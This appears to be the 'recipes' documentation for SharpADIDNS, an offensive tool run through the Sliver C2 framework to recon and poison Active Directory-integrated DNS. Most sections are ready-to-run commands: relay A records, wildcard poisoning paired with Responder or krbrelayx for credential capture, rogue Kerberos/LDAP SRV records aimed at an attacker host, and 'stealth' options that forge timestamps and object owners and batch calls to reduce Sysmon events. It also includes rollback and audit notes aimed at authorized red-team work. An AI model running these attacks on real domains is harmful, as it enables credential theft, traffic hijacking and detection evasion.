# Recipes

End-to-end scenarios. Each recipe is self-contained — you can skip to the one you need without reading the others.

Every recipe uses the [`--c2` mode](../README.md#using-via-sliver-execute-assembly) as the default invocation shape because the primary deployment is Sliver `execute-assembly`. To run any of these on a local shell instead, drop `--c2` and replace `--password-base64` with `--password` (and accept the cleartext warning).

## Variables used in all recipes

| Placeholder | Example value | Source |
| ----------- | ------------- | ------ |
| `$ZONE`     | `redteamnotes.local` | Output of `list-zones` (recipe 1) |
| `$DN`       | `DC=redteamnotes,DC=local` | Your domain naming context |
| `$DC`       | `dc.redteamnotes.local` | PDC FQDN (use `--show-pdc` to confirm) |
| `$USER`     | `redteamnotes\redpen` | Operator account |
| `$PWB64`    | `UmVkdGVhbU4wdDNzLg==` | `printf 'pwd' \| base64` |

Bring your own values; substitute everywhere.

### Argument syntax shortcuts

Two flag forms are accepted: `--flag value` (space-separated, used throughout the recipes) and `--flag=value` (equals form). The equals form is more robust through multi-layer shell parsing (Sliver `execute-assembly`, scripted ssh, etc.) when the value contains spaces, quotes, or `$`. Mixing is fine: `--username=corp\u --password-base64 UmVk...` works.

Per-verb help is also available: `SharpADIDNS.exe add --help` shows only the flags relevant to `add`; `enum --help` only the enum-relevant subset; etc. Global `--help` (no verb) prints the full reference.

---

## 1. DNS landscape recon

**Goal**: understand the AD-DNS environment before any write. Identify zones, interesting hostnames, ownership patterns. Read-only — no AD writes, no disk artifacts.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    --script "
        list-zones;
        enum --zone $ZONE --filter-type A,AAAA;
        enum --zone $ZONE --filter-name '_*._tcp.*';
        enum --zone $ZONE --only-tombstoned
    "
```

Output on stdout is 4 JSON arrays (one per statement) plus a `script_summary`. Pipe through `jq` operator-side:

```bash
# operator post-process
... | jq -c 'select(._type != "script_summary") | .nodes[] | {name, dn, records: [.records[].type]}'
```

Look for:
- Custom zones beyond the obvious one (often `dev.redteamnotes.local`, `lab.redteamnotes.local`)
- Wildcard `*` records (already deployed → don't clobber)
- `wpad` / `isatap` / `localhost` (legacy / honeypot indicators)
- SCCM / SQL / printer hostnames (high-impact targets)
- Tombstoned recent activity (defender / cleanup operation in progress)

---

## 2. Single-record add with rollback safety net

**Goal**: add one A record (e.g. for an SCCM relay or NTLM relay setup), capture pre-state in the receipt so you can revert.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    add --zone "$ZONE" --name sccm --type A --data 10.0.0.66
```

The receipt comes back as one JSON line. Save it on operator side before doing anything else:

```bash
... | tee /tmp/sccm-receipt.json | jq .
```

The receipt's `reverse` field is your one-line undo for the create case:

```json
{ "action":"add", "operation":"create",
  "reverse": "SharpADIDNS.exe remove --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local --yes",
  ... }
```

When you want to clean up:

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    remove --zone $ZONE --name sccm --dn $DN --server $DC
```

Note that `reverse` deliberately omits `--username`/`--password*` — re-add your auth flags.

---

## 3. Stealth add (mimic-aging + set-owner)

**Goal**: same as recipe 2, but tune the resulting `dnsRecord` blob and object owner to look like a routine DDNS write, defeating two common forensic patterns.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    add --zone "$ZONE" --name sccm --type A --data 10.0.0.66 \
        --mimic-aging \
        --set-owner "$ZONE\\DnsAdmins"
```

What's different from recipe 2:

| Field | Recipe 2 (default) | Recipe 3 (stealth) |
| ----- | ------------------ | ------------------ |
| `dnsRecord.Timestamp` (offset 20) | `0` (static — IOC) | `hours-since-1601` of now (looks DDNS-natural) |
| `dnsNode.nTSecurityDescriptor.Owner` | your token's SID | `DnsAdmins` (privileged group, blends with routine admin activity) |

Verify after the write:

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    query --zone "$ZONE" --name sccm
```

Confirm in the JSON receipt:
- `record.timestamp` is a big number (~3.7M+), not 0
- `permissions.owner` is `<domain>\DnsAdmins`

**Caveat**: `--set-owner` needs `WriteOwner` on the new node. The creator usually has it implicitly on a node they just made. If `set_owner.result` in the receipt is `"error"`, you don't have the right; the record write itself still succeeded.

---

## 4. Wildcard A injection (classic ADIDNS poisoning)

**Goal**: catch all unresolved name lookups in the zone, typically paired with Responder / Inveigh / krbrelayx for credential capture.

**WARNING**: this is the highest-impact write the tool can do. Run recipe 1 first to confirm no legitimate wildcard exists. Hits **every** non-existent hostname in the zone until removed. `--c2` already implies `--yes`, so the tool will not prompt — be deliberate.

```bash
# pre-check: does a wildcard already exist?
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    enum --zone "$ZONE" --filter-name '\*'

# inject (only if pre-check returned 0 nodes)
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    add --zone "$ZONE" --name "*" --type A --data 10.0.0.66 \
        --mimic-aging --ttl 60
```

`--ttl 60` makes the record short-lived in client caches — when you remove it, cleanup propagates within a minute. (Default 600 seconds is fine too, but 60 is friendlier for "in and out fast".)

Cleanup:

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    remove --zone $ZONE --name "*" --dn $DN --server $DC
```

Run recipe 1 again to confirm the wildcard is gone.

---

## 5. SRV record for Kerberos / LDAP relay

**Goal**: introduce a competing SRV record so Windows clients resolve a Kerberos or LDAP target to your relay host. High-impact for Kerberos relay attacks.

The classic target is `_ldap._tcp.dc._msdcs.<zone>` (where DCs advertise themselves). A new SRV with `priority 0 weight 100 port 389` will preempt the legitimate DC if your weight beats theirs, or coexist as a candidate.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    add --zone "$ZONE" --name '_ldap._tcp.dc._msdcs' --type SRV \
        --srv-priority 0 --srv-weight 100 --srv-port 389 \
        --data attacker.$ZONE \
        --append --mimic-aging
```

`--append` is the right mode here: the legitimate DC SRV record(s) stay; yours is added alongside. Without `--append`, you'd need `--force` and would clobber the real DC SRV (probably catastrophic).

To verify all SRV entries on the node afterwards:

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    query --zone "$ZONE" --name '_ldap._tcp.dc._msdcs'
```

Cleanup must remove **only your record**, not the legitimate DC SRVs. The receipt's `previous_state.records_base64` has the original SRV blobs. To restore exactly:

```bash
# operator: extract previous_state.records_base64 from the saved receipt,
# then for each b64 entry on the node:

# 1) disable the node entirely (clears all SRVs, sets tombstone)
sliver > execute-assembly ... disable --zone $ZONE --name '_ldap._tcp.dc._msdcs' --dn $DN

# 2) re-add each original SRV blob via --raw
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[0]> --force --dn $DN
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[1]> --append --dn $DN
# ... repeat for each remaining original record
```

This is multi-step on purpose; the tool's `reverse` field is `null` for `add --append` cases because no single command undoes it.

---

## 6. Batch op via `--script` (one execute-assembly, multiple actions)

**Goal**: do a 3-step operation (verify pre-state → modify → verify post-state) in a single `execute-assembly` invocation, so it shows up as **one** Sysmon EID 1 instead of three.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --zone "$ZONE" --dn "$DN" --server "$DC" \
    --script "
        enum --filter-name 'sccm*';
        add --name sccm --type A --data 10.0.0.66 --mimic-aging --set-owner '$ZONE\\\\DnsAdmins';
        query --name sccm
    "
```

Note the doubled backslash `\\\\` inside `--set-owner`: Sliver's command parser eats one pair, the C# arg parser eats the second pair, the resulting string seen by the tool is `$ZONE\DnsAdmins`. **Always test the escape level in your specific Sliver setup first** with a `--dry-run` script.

Output on stdout: 3 receipts (one per statement) + 1 `script_summary` line. Pipe through `jq -c .` on operator side; each line is independently valid JSON, and all four share the same `correlation_id` so a downstream collector can group them with `jq -s 'group_by(.correlation_id)'`.

`--script-on-error halt` (the default) stops on first failure. For "best-effort batch" use `--script-on-error continue` (or the shorter alias `--continue-on-error`) and check the `failed` count in the summary.

---

## 7. Engagement cleanup from a backup file

**Goal**: undo every write you made during the engagement, using only the JSONL backup file you've been accumulating.

Throughout the engagement, you've been adding `--backup-to ops.jsonl` (a real path, not `-`) so every write captures its `previous_state` to a file on a host you control. Now you want to revert.

```bash
# operator-side: each line in ops.jsonl is a self-contained backup entry
# of one node. Process them in reverse order (newest first):

tac ops.jsonl | while IFS= read -r entry; do
    dn=$(jq -r .dn <<<"$entry")
    name=$(jq -r '.dn | split(",")[0] | sub("^DC="; "")' <<<"$entry")
    zone=$(jq -r '.dn | split(",")[1] | sub("^DC="; "")' <<<"$entry")  # adapt to your zone DN
    records=$(jq -c '.records' <<<"$entry")
    tombstoned=$(jq -r .dNSTombstoned <<<"$entry")

    if [ "$records" = "[]" ] && [ "$tombstoned" = "false" ]; then
        # node didn't exist before our change -> remove it now
        sliver > execute-assembly ... remove --zone "$zone" --name "$name" ...
    else
        # node existed -> disable to clear our writes, then re-add each original record
        sliver > execute-assembly ... disable --zone "$zone" --name "$name" ...
        jq -r '.records[]' <<<"$entry" | while read -r blob; do
            sliver > execute-assembly ... add --raw "$blob" --force --zone "$zone" --name "$name" ...
        done
    fi
done
```

Test this loop against one entry first (with `--dry-run` appended to each `execute-assembly`). Then run for real.

For an entirely in-memory equivalent without `ops.jsonl` on disk, you'd have to have been saving the receipt of every write on the C2 side instead. Same logic, different source.

---

## 8. Pre-flight permissions check (DACL recon)

**Goal**: before attempting a `--force` replace or `remove`, confirm you have write rights on the target node — without actually doing the write.

```bash
sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
    --c2 --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    query --zone "$ZONE" --name fileserver -v
```

`-v` (verbose) also dumps inherited ACEs. In the receipt's `permissions.aces[]`, look for:

- Entries where `trustee` includes your user / a group you're in / `Authenticated Users`
- `type: "Allow"` (not Deny)
- `rights` contains `WriteProperty`, `WriteDacl`, or `GenericAll`

If none match → operator doesn't have rights → don't attempt the write, save the audit event.

If the only matching ACE is `Authenticated Users` with `CreateChild` on the zone container (not on the node itself), you can create *new* nodes but cannot modify the existing one — relevant for `--append` semantics.

---

## Cross-cutting safety reminders

These apply to every recipe, not just one:

- **Always `--dry-run` first** for any write op you've never done in this environment. The dry-run still binds (so it audit-logs as a read), but does not write.
- **Always have a restore plan** before you write. Either `--backup-to file` (disk-cost) or `--backup-to -` (in-receipt, ephemeral) or you've manually captured `previous_state` from the receipt.
- **`--c2` implies `--yes`** — there's no human prompt. The tool will not stop you from wildcards, `wpad`/`isatap`, un-tombstoning, or hard-remove. Be deliberate.
- **DC-side audit (5136 / 5137 / 5141) and Defender for Identity sensors fire regardless of `--c2`**. The tool minimizes your operator-side surface; nothing in the tool hides you from the DC's audit logs.
- **`reverse` field is best-effort one-liner**. For replace / append / disable / remove, `reverse` is `null` and you must reconstruct from `previous_state.records_base64`. Don't rely on `reverse` alone — keep the full receipt.

For the broader detection model see [`Detection surface`](../README.md#detection-surface) in the main README.
